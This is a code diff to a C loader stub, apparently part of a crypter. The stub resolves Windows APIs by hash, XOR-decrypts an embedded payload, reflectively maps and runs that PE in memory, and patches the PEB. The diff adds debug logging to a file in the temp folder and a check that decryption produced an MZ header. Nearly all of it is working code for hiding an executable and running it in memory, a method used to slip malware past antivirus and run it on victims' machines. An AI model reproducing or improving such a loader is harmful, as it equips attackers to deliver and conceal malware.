@@ -135,10 +135,67 @@ static BYTE *_find_module(DWORD modHash) {
 #define H_GetCurrentProcess     0xCA8D7527
 #define H_NTDLL                 0x22D3B5ED
 #define H_RtlAddFunctionTable   0xBDB9F1AE
+#define H_CreateFileA           0xEB96C5FA
+#define H_WriteFile             0x663CECB0
+#define H_GetTempPathA          0x9EF979E9
+#define H_CloseHandle           0x3870CA07
+
+/* ─── Debug tracing (writes to %TEMP%\stub_debug.log) ─── */
+#ifdef STUB_DEBUG
+
+typedef HANDLE (WINAPI *fnCreateFileA_t)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
+typedef BOOL   (WINAPI *fnWriteFile_t)(HANDLE,LPCVOID,DWORD,LPDWORD,LPVOID);
+typedef DWORD  (WINAPI *fnGetTempPathA_t)(DWORD,LPSTR);
+typedef BOOL   (WINAPI *fnCloseHandle_t)(HANDLE);
+
+static fnCreateFileA_t  _dbg_CreateFileA;
+static fnWriteFile_t    _dbg_WriteFile;
+static fnGetTempPathA_t _dbg_GetTempPathA;
+static fnCloseHandle_t  _dbg_CloseHandle;
+static char             _dbg_path[260];
+
+static void _dbg_init(BYTE *k32) {
+    _dbg_CreateFileA  = (fnCreateFileA_t) _resolve_export(k32, H_CreateFileA);
+    _dbg_WriteFile    = (fnWriteFile_t)   _resolve_export(k32, H_WriteFile);
+    _dbg_GetTempPathA = (fnGetTempPathA_t)_resolve_export(k32, H_GetTempPathA);
+    _dbg_CloseHandle  = (fnCloseHandle_t) _resolve_export(k32, H_CloseHandle);
+    if (_dbg_GetTempPathA) {
+        DWORD n = _dbg_GetTempPathA(240, _dbg_path);
+        /* append filename manually — no lstrcpy dependency */
+        const char *tail = "stub_debug.log";
+        for (int i = 0; tail[i]; i++) _dbg_path[n + i] = tail[i];
+        _dbg_path[n + 14] = '\0';
+    }
+}
+
+static void _dbg_log(const char *msg) {
+    if (!_dbg_CreateFileA || !_dbg_WriteFile) return;
+    HANDLE h = _dbg_CreateFileA(_dbg_path, 4/*FILE_APPEND_DATA*/, 3/*SHARE_RW*/, 0,
+                                 4/*OPEN_ALWAYS*/, 0x80/*NORMAL*/, 0);
+    if (h != (HANDLE)-1) {
+        DWORD n = 0;
+        const char *p = msg;
+        while (*p) { n++; p++; }
+        DWORD w;
+        _dbg_WriteFile(h, msg, n, &w, 0);
+        _dbg_WriteFile(h, "\r\n", 2, &w, 0);
+        _dbg_CloseHandle(h);
+    }
+}
+
+#define SLOG(msg) _dbg_log(msg)
+#else
+#define SLOG(msg) ((void)0)
+#endif /* STUB_DEBUG */
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
     BYTE *k32 = _find_module(H_KERNEL32);
     if (!k32) return FALSE;
+
+#ifdef STUB_DEBUG
+    _dbg_init(k32);
+    SLOG("[stub] kernel32 found, resolving APIs...");
+#endif
 
     api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
     api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
@@ -148,21 +205,22 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
     api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
     api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
 
+    SLOG("[stub] core APIs resolved");
+
 #if defined(_M_X64) || defined(__x86_64__)
-    /* RtlAddFunctionTable is in kernel32 (forwards to ntdll).
-     * Without it, ANY exception in the loaded PE crashes the process
-     * because the OS can't find the unwind info for the code range. */
     api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
     if (!api->pRtlAddFunctionTable) {
-        /* Fallback: try ntdll directly */
         BYTE *ntdll = _find_module(H_NTDLL);
         if (ntdll)
             api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
     }
+    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable resolved" : "[stub] RtlAddFunctionTable MISSING!");
 #endif
 
-    return (api->pLoadLibraryA && api->pGetProcAddress &&
-            api->pVirtualAlloc && api->pVirtualProtect);
+    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
+               api->pVirtualAlloc && api->pVirtualProtect);
+    SLOG(ok ? "[stub] API resolve OK" : "[stub] API resolve FAILED");
+    return ok;
 }
 
 
@@ -308,12 +366,16 @@ static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
 
 /* Main PE loader function */
 static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
+    SLOG("[stub] load_pe_and_run enter");
+
     /* Validate PE */
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ signature"); return FALSE; }
 
     IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE signature"); return FALSE; }
+
+    SLOG("[stub] PE validated OK");
 
     /* Allocate memory at preferred base, fall back to any address */
     DWORD imageSize = nt->OptionalHeader.SizeOfImage;
@@ -326,13 +388,15 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
 
     LONGLONG delta = 0;
     if (!base) {
-        /* Preferred base unavailable — allocate anywhere */
         base = (BYTE *)api->pVirtualAlloc(
             NULL, imageSize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
-        if (!base) return FALSE;
+        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
+        SLOG("[stub] allocated at fallback address");
+    } else {
+        SLOG("[stub] allocated at preferred base");
     }
     delta = (LONGLONG)(base - nt->OptionalHeader.ImageBase);
 
@@ -349,28 +413,28 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
         for (DWORD j = 0; j < sec->SizeOfRawData; j++)
             dst[j] = src[j];
     }
+    SLOG("[stub] sections mapped");
 
     /* Fix up NT headers pointer to mapped copy */
     IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
 
     /* Process relocations */
     if (delta != 0) {
-        if (!_process_relocs(base, mappedNt, delta))
-            return FALSE;
+        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocations"); return FALSE; }
+        SLOG("[stub] relocations applied");
+    } else {
+        SLOG("[stub] no relocations needed (preferred base)");
     }
 
     /* Resolve imports */
-    if (!_process_imports(base, mappedNt, api))
-        return FALSE;
+    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
+    SLOG("[stub] imports resolved");
 
     /* Flush instruction cache */
     if (api->pFlushInstructionCache && api->pGetCurrentProcess)
         api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);
 
-    /* Register exception handlers (x64 ONLY — CRITICAL)
-     * Without this, any structured exception in the loaded PE causes
-     * STATUS_BAD_FUNCTION_TABLE and the process is killed instantly.
-     * This includes CRT init, __try/__except, and even stack unwinding. */
+    /* Register exception handlers (x64 ONLY — CRITICAL) */
 #if defined(_M_X64) || defined(__x86_64__)
     {
         IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -378,15 +442,20 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
             PRUNTIME_FUNCTION pFuncTable = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
             DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
             api->pRtlAddFunctionTable(pFuncTable, numEntries, (DWORD64)base);
+            SLOG("[stub] exception handlers registered");
+        } else {
+            SLOG("[stub] WARNING: no exception dir or RtlAddFunctionTable missing");
         }
     }
 #endif
 
     /* Set section protections */
     _protect_sections(base, mappedNt, api);
+    SLOG("[stub] section protections set");
 
     /* Process TLS */
     _process_tls(base, mappedNt);
+    SLOG("[stub] TLS processed");
 
     /* Update the PEB ImageBaseAddress so the loaded PE sees itself correctly */
     {
@@ -398,24 +467,26 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
 #endif
         *(void **)((BYTE *)peb + 0x10) = base;
     }
+    SLOG("[stub] PEB updated");
 
     /* Call entry point */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
-    if (!entryRVA) return FALSE;
+    if (!entryRVA) { SLOG("[stub] FAIL: no entry point"); return FALSE; }
 
     void *entry = base + entryRVA;
+    SLOG("[stub] calling entry point...");
 
     /* Determine if it's a DLL (DllMain) or EXE (WinMain/main) */
     if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
         DllMain_t dllMain = (DllMain_t)entry;
         dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
     } else {
-        /* EXE — call entry point (mainCRTStartup) which sets up CRT and calls main/WinMain */
         typedef void (*EntryPoint_t)(void);
         EntryPoint_t ep = (EntryPoint_t)entry;
         ep();
     }
 
+    SLOG("[stub] entry point returned");
     return TRUE;
 }
 
@@ -438,9 +509,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (!_resolve_apis(&api))
         return 1;
 
+    SLOG("[stub] Phase 2: decrypting payload...");
+
     /* Phase 2: Decrypt payload in-place */
     for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
         g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];
+
+    /* Quick sanity check: first 2 bytes should be 'MZ' after decrypt */
+    if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
+        SLOG("[stub] FAIL: decryption produced bad MZ header");
+        return 1;
+    }
+    SLOG("[stub] decryption OK, MZ validated");
 
     /* Phase 3: Reflectively load the decrypted PE and execute */
     if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api))
